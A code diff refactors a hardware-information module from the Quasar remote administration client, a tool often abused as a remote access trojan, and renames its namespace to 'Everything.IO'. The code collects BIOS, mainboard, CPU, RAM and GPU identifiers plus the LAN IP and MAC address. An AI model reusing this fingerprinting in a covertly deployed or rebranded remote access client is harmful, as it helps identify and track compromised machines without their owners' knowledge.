@@ -6,7 +6,7 @@ using System.Management;
 using System.Net.NetworkInformation;
 using System.Net.Sockets;
 
-namespace Quasar.Client.IO
+namespace Everything.IO
 {
     /// <summary>
     /// Provides access to retrieve information about the used hardware devices.
@@ -88,10 +88,10 @@ namespace Quasar.Client.IO
         {
             try
             {
-                string biosIdentifier = string.Empty;
-                string query = "SELECT * FROM Win32_BIOS";
+                var biosIdentifier = string.Empty;
+                var query = "SELECT * FROM Win32_BIOS";
 
-                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
+                using (var searcher = new ManagementObjectSearcher(query))
                 {
                     foreach (ManagementObject mObject in searcher.Get())
                     {
@@ -100,7 +100,7 @@ namespace Quasar.Client.IO
                     }
                 }
 
-                return (!string.IsNullOrEmpty(biosIdentifier)) ? biosIdentifier : "N/A";
+                return !string.IsNullOrEmpty(biosIdentifier) ? biosIdentifier : "N/A";
             }
             catch
             {
@@ -113,10 +113,10 @@ namespace Quasar.Client.IO
         {
             try
             {
-                string mainboardIdentifier = string.Empty;
-                string query = "SELECT * FROM Win32_BaseBoard";
+                var mainboardIdentifier = string.Empty;
+                var query = "SELECT * FROM Win32_BaseBoard";
 
-                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
+                using (var searcher = new ManagementObjectSearcher(query))
                 {
                     foreach (ManagementObject mObject in searcher.Get())
                     {
@@ -125,7 +125,7 @@ namespace Quasar.Client.IO
                     }
                 }
 
-                return (!string.IsNullOrEmpty(mainboardIdentifier)) ? mainboardIdentifier : "N/A";
+                return !string.IsNullOrEmpty(mainboardIdentifier) ? mainboardIdentifier : "N/A";
             }
             catch
             {
@@ -138,10 +138,10 @@ namespace Quasar.Client.IO
         {
             try
             {
-                string cpuName = string.Empty;
-                string query = "SELECT * FROM Win32_Processor";
+                var cpuName = string.Empty;
+                var query = "SELECT * FROM Win32_Processor";
 
-                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
+                using (var searcher = new ManagementObjectSearcher(query))
                 {
                     foreach (ManagementObject mObject in searcher.Get())
                     {
@@ -150,7 +150,7 @@ namespace Quasar.Client.IO
                 }
                 cpuName = StringHelper.RemoveLastChars(cpuName);
 
-                return (!string.IsNullOrEmpty(cpuName)) ? cpuName : "N/A";
+                return !string.IsNullOrEmpty(cpuName) ? cpuName : "N/A";
             }
             catch
             {
@@ -163,14 +163,14 @@ namespace Quasar.Client.IO
         {
             try
             {
-                int installedRAM = 0;
-                string query = "Select * From Win32_ComputerSystem";
+                var installedRAM = 0;
+                var query = "Select * From Win32_ComputerSystem";
 
-                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
+                using (var searcher = new ManagementObjectSearcher(query))
                 {
                     foreach (ManagementObject mObject in searcher.Get())
                     {
-                        double bytes = (Convert.ToDouble(mObject["TotalPhysicalMemory"]));
+                        var bytes = Convert.ToDouble(mObject["TotalPhysicalMemory"]);
                         installedRAM = (int)(bytes / 1048576); // bytes to MB
                         break;
                     }
@@ -188,10 +188,10 @@ namespace Quasar.Client.IO
         {
             try
             {
-                string gpuName = string.Empty;
-                string query = "SELECT * FROM Win32_DisplayConfiguration";
+                var gpuName = string.Empty;
+                var query = "SELECT * FROM Win32_DisplayConfiguration";
 
-                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
+                using (var searcher = new ManagementObjectSearcher(query))
                 {
                     foreach (ManagementObject mObject in searcher.Get())
                     {
@@ -200,7 +200,7 @@ namespace Quasar.Client.IO
                 }
                 gpuName = StringHelper.RemoveLastChars(gpuName);
 
-                return (!string.IsNullOrEmpty(gpuName)) ? gpuName : "N/A";
+                return !string.IsNullOrEmpty(gpuName) ? gpuName : "N/A";
             }
             catch
             {
@@ -211,19 +211,19 @@ namespace Quasar.Client.IO
         private static string GetLanIpAddress()
         {
             // TODO: support multiple network interfaces
-            foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
+            foreach (var ni in NetworkInterface.GetAllNetworkInterfaces())
             {
-                GatewayIPAddressInformation gatewayAddress = ni.GetIPProperties().GatewayAddresses.FirstOrDefault();
+                var gatewayAddress = ni.GetIPProperties().GatewayAddresses.FirstOrDefault();
                 if (gatewayAddress != null) //exclude virtual physical nic with no default gateway
                 {
                     if (ni.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 ||
                         ni.NetworkInterfaceType == NetworkInterfaceType.Ethernet &&
                         ni.OperationalStatus == OperationalStatus.Up)
                     {
-                        foreach (UnicastIPAddressInformation ip in ni.GetIPProperties().UnicastAddresses)
+                        foreach (var ip in ni.GetIPProperties().UnicastAddresses)
                         {
                             if (ip.Address.AddressFamily != AddressFamily.InterNetwork ||
-                                ip.AddressPreferredLifetime == UInt32.MaxValue) // exclude virtual network addresses
+                                ip.AddressPreferredLifetime == uint.MaxValue) // exclude virtual network addresses
                                 continue;
 
                             return ip.Address.ToString();
@@ -237,20 +237,20 @@ namespace Quasar.Client.IO
 
         private static string GetMacAddress()
         {
-            foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
+            foreach (var ni in NetworkInterface.GetAllNetworkInterfaces())
             {
                 if (ni.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 ||
                     ni.NetworkInterfaceType == NetworkInterfaceType.Ethernet &&
                     ni.OperationalStatus == OperationalStatus.Up)
                 {
-                    bool foundCorrect = false;
-                    foreach (UnicastIPAddressInformation ip in ni.GetIPProperties().UnicastAddresses)
+                    var foundCorrect = false;
+                    foreach (var ip in ni.GetIPProperties().UnicastAddresses)
                     {
                         if (ip.Address.AddressFamily != AddressFamily.InterNetwork ||
-                            ip.AddressPreferredLifetime == UInt32.MaxValue) // exclude virtual network addresses
+                            ip.AddressPreferredLifetime == uint.MaxValue) // exclude virtual network addresses
                             continue;
 
-                        foundCorrect = (ip.Address.ToString() == GetLanIpAddress());
+                        foundCorrect = ip.Address.ToString() == GetLanIpAddress();
                     }
 
                     if (foundCorrect)
